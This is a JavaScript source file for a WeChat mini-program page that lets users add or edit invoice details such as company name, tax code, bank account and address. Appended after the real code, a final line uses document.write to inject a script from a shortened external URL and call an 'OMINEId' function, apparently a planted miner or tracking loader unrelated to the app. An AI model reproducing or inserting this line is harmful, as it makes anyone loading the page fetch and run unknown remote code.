var t = getApp(),
  app =t,
  e = t.requirejs("core"),
  a = t.requirejs("foxui"),
  i = t.requirejs("jquery"),
  $ = i,
  address = t.requirejs("address/adresscode-handle");
Page({
  data: {
    id: null,
    posting: false,
    isCompany:true,
    subtext: "保存设置",
    detail01:{
      company_area_code:""
    },
    detail: {
      invoice_type: 1,
      invoice_header: '',
      company_phone: '',
      company_area_code: '',
      company_address: '',
      company_tax_code: '',
      company_bank_name: '',
      company_bank_acount: '',
      invoice_owner: '',
      mobile: '',
      area_code: '',
      address: '',
      id: '',
      invoice_status: 1
    },
    showPicker01: false,
    pvalOld01: [2, 0, 0],
    pval01: [2, 0, 0],
    showPicker: false,
    pvalOld: [2, 0,0],
    pval: [2, 0,0],
    orign:[],
    areas: address.DISTRICT,
    cities: address.cities,
    ares: address.all_Areas,
    show:true,
    status:true,
    street: [],
    streetIndex: 0,
    noArea: false
  },
  onShow:function(e){
  },
  onLoad: function (e) {
    var subtext ="保存设置";
    if (e.id) { subtext ="提交修改";};
    this.setData({
      id: Number(e.id),
      subtext: subtext,
      detail: {
        invoice_type:1,
        invoice_header: '',
        company_phone: '',
        company_area_code: '',
        company_address: '',
        company_tax_code: '',
        company_bank_name:'',
        company_bank_acount: '',
        invoice_owner: '',
        mobile: '',
        area_code:'',
        address:'',
        id:'',
        invoiceId: e.id ? e.id:"",
        invoice_status: 1}
    }),
      e.id && this.getDetail(false, Number(e.id) ,function(){
        wx.showToast({
          title: '数据获取成功',
          icon: 'success',
          duration: 2000
        })
      }),
      e.id && wx.setNavigationBarTitle({
        title: "修改发票信息"
      }),
      this.setData({
        areas: t.getCache("cacheset").areas,
        type: e.type
      });
  },
  getDetail: function (addObject, idObj, fn){
    var _this=this;
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token,
        invoiceId:idObj
      };
    };
    wx.request({
      url: t.globalData.daxin + "/customer/userInvoiceHeader",
      data: datas,
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        _this.setData({
          posting: false
        })
        if (res.data.statusCode >= 0 && res.data.msg =="success"&& addObject) {
          if (fn) fn();
          return;
        } ;
        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          var details = res.data.data.list[0];
          var getAdrrs = address.getData(details.company_area_code);
          details.addrs = getAdrrs.join("");
          details.province = getAdrrs[0] ; 
          details.city = getAdrrs[1];
          details.area = getAdrrs[2]||"";   
          var details01={}; 
          var SgetAdrrs = address.getData(details.area_code);
          details01.addrs = SgetAdrrs.join("");
          details01.province = SgetAdrrs[0];
          details01.city = SgetAdrrs[1];
          details01.area = SgetAdrrs[2] || "";  
          _this.setData({
            detail: $.extend(_this.data.detail, details),
            detail01: details01
          });
          wx.showToast({
            title: '数据获取成功',
            icon: 'success',
            duration: 800
          });
        } else {
          wx.showModal({
            title: '错误提示',
            content: addObject ? '发票修改失败': '发票数据获取失败',
            showCancel: false,
            success: function () {
              if (res.confirm) {

              }
            }
          })
        }
      }
    })
  },
  submit: function () {
    var t = this,
      i = t.data.detail;
    var checkdata = {
      invoice_header: '发票抬头',
      company_phone: '企业电话',
      company_area_code: '注册地址',
      company_address: '详细地址',
      company_tax_code: '纳税人识别号',
      company_bank_name:'开户银行',
      company_bank_acount: '银行账号',
      invoice_owner: '收票人',
      mobile: '联系电话',
      area_code:'所在地址',
      address:'详细地址'}
    i.action ="add";
    var isDataCheck=true;
    if (this.data.id) { i.action ="update"};
    i.area_code = i.area_code ? i.area_code : (i.datavalue?i.datavalue.substr(-6,6):"");
    i.company_area_code = i.company_area_code ? i.company_area_code : (i.datavalue?i.datavalue.substr(-6, 6):"");
    if (!t.data.posting) {
      $.each(checkdata,function(ind,val){
          if(!i[ind] || i[ind==""]){
            isDataCheck =false;
            void a.toast(t, "请填写"+checkdata[ind]);
            return false;
          }

      });
      
      if (i.mobile != "" || i.company_phone !="") {
        var reg = /^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$/;
        let reg2 =/\d{3}\d{8}|\d{4}-\d{7}/g;
        if (!reg.test(i.mobile.trim())) {
          return void a.toast(t, "联系电话填写有误，请重新填写");
        };
       // console.log(!reg.test(i.company_phone), !reg2.test(i.company_phone));
        if (!reg.test(i.company_phone.trim()) && !reg2.test(i.company_phone.trim())){
          return void a.toast(t, "企业电话填写有误，请重新填写");
        }
      };
      if (!isDataCheck){return;};
        t.setData({
          posting: true
        }),
        t.getDetail(i,false,function(){
        wx.showModal({
          title: '信息提示',
          content: i.invoiceId ? '数据修改成功':'数据提交成功',
          showCancel: false,
          success: function (res) {
            if (res.confirm) {
              wx.navigateBack();
            }
           }
          })
        });
        // e.post("member/address/submit", i, function (i) {
        //   if (0 != i.error)
        //     return t.setData({
        //       posting: false
        //     }), void a.toast(t, i.message);
        //   t.setData({
        //     subtext: "保存成功"
        //   }),
        //     e.toast("保存成功"),
        //     setTimeout(function () {
        //       "member" == t.data.type ? wx.navigateBack() : wx.redirectTo({
        //         url: "/pages/member/address/select"
        //       })
        //     }, 1e3)
        // })
    }
  },
  onChange: function (t) {
    var e = this,
      a = e.data.detail,
      r = t.currentTarget.dataset.type,
      s = i.trim(t.detail.value);
    "street" == r && (a.streetdatavalue = e.data.street[s].code, s = e.data.street[s].name),
      a[r] = s,
      e.setData({
        detail: a
      })
  },
  selectArea: function (t) {
    var e = t.currentTarget.dataset.area,
      types = t.currentTarget.dataset.type,
      a = this.getIndex(e, this.data.areas);
    var iscompany = this.data.isCompany;
    if (types =="area_code"){
      iscompany =false;
    }
      this.setData({
        pval: a,
        pvalOld: a,
        isCompany: iscompany,
        showPicker: true
      })
    
  },
  bindChange: function (t) {
    var e = this.data.pvalOld,
       a = t.detail.value,
      iscompany = this.data.isCompany;
      //console.log(t, address.DISTRICT[a[0]], a,t.target.dataset.key);
      e[0] !=  a[0] && (a[1] = 0),
      e[1] != a[1] && (a[2] = 0),
      this.setData({
        pval: a,
        pvalOld: a
      })
  },
  onCancel: function (t) {
    this.setData({
      showPicker: false
    })
  },
  setDefault:function(){
     var status = this.data.status || false; 
     var details= this.data.detail;
    if (status) { status = false; details.invoice_status = 0; } else { status = true; details.invoice_status=1;};
     this.setData({
       status:status,
       detail: details
     });
  },
  onConfirm: function (t) {
    var e = this.data.pval,
      a = this.data.ares,
      i = this.data.detail,
      ielse = $.extend({},i),
      detail01 =this.data.detail01,
      iscompany =this.data.isCompany;
      i.province = a[e[0]].name,
      i.city = a[e[0]].city[e[1]].name,
      i.datavalue = a[e[0]].code + "," + a[e[0]].city[e[1]].code,
      a[e[0]].city[e[1]].area && a[e[0]].city[e[1]].area.length > 0 ? (i.area = a[e[0]].city[e[1]].area[e[2]].name, i.datavalue += "," + a[e[0]].city[e[1]].area[e[2]].code ): i.area = "",
      i.street = "";
      ielse.company_area_code = i.datavalue;
      //console.log(i);
        var data = {
          streetIndex: 0,
          showPicker: false
        };
    if (iscompany){
      data.detail=i;
    }else{
      data.detial = ielse;
      data.detail01 = i;
    }
      this.setData(data);
  },
  getIndex: function (t, e) {
    if ("" == i.trim(t) || !i.isArray(e))
      return [0, 0, 0];
    var a = t.split(" "),
      r = [0, 0, 0];
    for (var s in e)
      if (e[s].name == a[0]) {
        r[0] = Number(s);
        for (var d in e[s].city)
          if (e[s].city[d].name == a[1]) {
            r[1] = Number(d);
            for (var n in e[s].city[d].area)
              if (e[s].city[d].area[n].name == a[2]) {
                r[2] = Number(n);
                break
              }
            break
          }
        break
      }
    return r
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
